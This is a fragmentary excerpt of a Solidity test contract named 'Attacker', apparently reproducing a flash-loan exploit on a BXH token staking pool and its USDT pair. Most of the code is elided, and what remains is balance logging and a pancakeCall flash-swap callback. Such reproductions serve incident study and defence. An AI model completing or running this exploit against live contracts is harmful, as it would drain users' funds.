...
contract Attacker is Test {
    ...
    function testExploit() public {
        ...
        emit log_named_decimal_uint("[Pair] Pair USDT Balance is :", usdt.balanceOf(address(bxhusdtpair)), 18);
        emit log_named_decimal_uint("[Pair] Pair BXH Balance is :", BXH.balanceOf(address(bxhusdtpair)), 18);
    ...
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        ...
        emit log_named_decimal_uint("[Received] Pending amount price is", bxhtokenstaking.getITokenBonusAmount(0, 15.24 ether), 18);
        emit log_named_decimal_uint("[Received] Received USDT Balance is :", usdt.balanceOf(address(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f)), 18);
